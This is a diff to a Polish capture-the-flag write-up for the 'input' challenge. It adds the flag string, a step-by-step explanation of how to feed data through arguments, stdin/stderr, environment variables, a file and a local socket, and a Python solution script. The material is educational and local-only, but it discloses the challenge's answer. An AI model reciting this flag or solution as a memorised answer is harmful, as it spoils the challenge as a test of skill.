@@ -1,6 +1,6 @@
 ## input - 4 pt ##
 
-Flaga: ``
+Flaga: `Mommy! I learned how to pass various input in Linux :)`
 
 Kod źródłowy **input.c**:
 ```c
@@ -71,4 +71,70 @@ int main(int argc, char* argv[], char* envp[]){
 	system("/bin/cat flag");	
 	return 0;
 }
+```
+* Program wymaga od nas przekazania inputu (zgodnie z nazwą zadania ;-) ) za pomocą różnych mechanizmów: argumenty, standardowe wejście i stderr, zmienne środowiskowe, pliki oraz sieć
+* Pierwszy etap - przekazanie inputu za pomocą `argv`
+  * Binarka wymaga od nas podania 100 argumentów
+  * Dwa argumenty muszą zawierać odpowiednie dane, konkretnie 65 i 66 (kod ASCII dla liter "A" oraz "B"):
+    * Argument 65 - `\x00`
+    * Argument 66 - `\x20\x0a\x0d`
+* Drugi etap - standardowe wejście i stderr
+  * STDIN - wartość `\x00\x0a\x00\xff`
+  * STDERR - wartość `\x00\x0a\x02\xff`
+  * Pisząc exploita musimy pamiętać aby przekazać te wartości za pomocą pipe'ów - forkujemy proces i wrzucamy jednym pipe'm do stdin i jednym do stderr
+* Trzeci etap - zmienne środowiskowe
+  * Przekazanie zmiennej o nazwie w postaci szesnastkowej `\xde\xad\xbe\xef` i wartości `\xca\xfe\xba\xbe`
+  * Tutaj oczywistym wyborem jest parametr env w funkcji `execve()`
+* Czwarty etap - plik
+  * IMHO najłatwiejszy stage - wystarczy dowolną metodą utworzyć plik binarny zawierający cztery bajty NULL: `\x00\x00\x00\x00`
+* Etap piąty - sieć
+  * Wymagane jest stworzenie serwera nasłuchującego lokalnie i wysłanie tam czterech bajtów: `\xde\xad\xbe\xef`
+* Lekko przerobiony pod kątem czytelności exploit z https://gist.github.com/cubarco/cd96eca5e3940c7a3fe4 : 
+
+```python
+#!/usr/bin/env python
+# coding=utf8
+
+import os
+import socket
+import time 
+
+port = 13337
+r_stdin, w_stdin = os.pipe()
+r_stderr, w_stderr = os.pipe()
+
+os.system('ln -s /home/input/flag ./')
+with open('\n', 'w') as f:
+    f.write('\x00\x00\x00\x00')
+
+pid = os.fork()
+
+if pid == 0:
+    os.close(w_stdin)
+    os.close(w_stderr)
+    
+    os.dup2(r_stdin, 0)
+    os.dup2(r_stderr, 2)
+
+    os.putenv('\xde\xad\xbe\xef', '\xca\xfe\xba\xbe')
+    os.execv('/home/input/input', ['input'] + ['A'] * 64 + [''] + ['\x20\x0a\x0d'] + [str(port)] + ['A']* 32)
+else:
+    os.close(r_stdin)
+    os.close(r_stderr)
+
+    wf0 = os.fdopen(w_stdin, 'w')
+    wf2 = os.fdopen(w_stderr, 'w')
+    
+    wf0.write('\x00\x0a\x00\xff')
+    wf2.write('\x00\x0a\x02\xff')
+
+    wf0.close()
+    wf2.close()
+    
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    time.sleep(1)
+
+    client.connect(('localhost', port))
+    client.send('\xde\xad\xbe\xef')
+    client.close()
 ```
